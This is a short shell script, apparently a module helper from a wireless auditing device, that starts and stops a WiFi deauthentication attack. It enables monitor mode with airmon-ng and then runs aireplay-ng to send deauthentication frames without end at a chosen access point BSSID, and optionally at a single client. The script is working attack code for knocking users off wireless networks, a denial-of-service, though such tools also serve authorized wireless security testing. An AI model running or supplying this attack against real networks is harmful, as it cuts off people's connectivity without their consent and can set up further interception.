#!/bin/sh
#2015 - Whistle Master

MYTIME=`date +%s`
LOG=/tmp/SiteSurvey.log
LOCK=/tmp/SiteSurvey_deauth.lock

MYMONITOR=''
MYINTERFACE=$2
BSSID=$3
CLIENT=$4

if [ "$1" = "start" ]; then

  killall -9 aireplay-ng
	rm ${LOG}
  rm ${LOCK}

	echo -e "Starting Deauth..." > ${LOG}

	if [ -z "$MYINTERFACE" ]; then
		MYINTERFACE=`iwconfig 2> /dev/null | grep "Mode:Master" | awk '{print $1}' | head -1`
	else
		MYFLAG=`iwconfig 2> /dev/null | awk '{print $1}' | grep ${MYINTERFACE}`

		if [ -z "$MYFLAG" ]; then
		    MYINTERFACE=`iwconfig 2> /dev/null | grep "Mode:Master" | awk '{print $1}' | head -1`
		fi
	fi

	if [ -z "$MYMONITOR" ]; then
		MYMONITOR=`iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' | grep ${MYINTERFACE}`

		MYFLAG=`iwconfig 2> /dev/null | awk '{print $1}' | grep ${MYMONITOR}`

		if [ -z "$MYFLAG" ]; then
		    airmon-ng start ${MYINTERFACE}
		    MYMONITOR=`iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' | grep ${MYINTERFACE}`
		fi
	else
		MYFLAG=`iwconfig 2> /dev/null | awk '{print $1}' | grep ${MYMONITOR}`

		if [ -z "$MYFLAG" ]; then
		    airmon-ng start ${MYINTERFACE}
		    MYMONITOR=`iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' | grep ${MYINTERFACE}`
		fi
	fi

	echo -e "Monitor : ${MYMONITOR}" >> ${LOG}
  echo -e "BSSID : ${BSSID}" >> ${LOG}

  if [ -n "$CLIENT" ]; then
    echo -e "Client : ${CLIENT}" >> ${LOG}
  fi

  if [ -n "$CLIENT" ]; then
    echo ${BSSID} > ${LOCK}
    echo ${CLIENT} >> ${LOCK}

    aireplay-ng -0 0 --ignore-negative-one -D -c ${CLIENT} -a ${BSSID} ${MYMONITOR} &> /dev/null &
  else
    echo ${BSSID} > ${LOCK}
    aireplay-ng -0 0 --ignore-negative-one -D -a ${BSSID} ${MYMONITOR} &> /dev/null &
  fi

  echo -e "Deauth is running..." >> ${LOG}

elif [ "$1" = "stop" ]; then

  killall -9 aireplay-ng
	rm ${LOG}
  rm ${LOCK}

fi
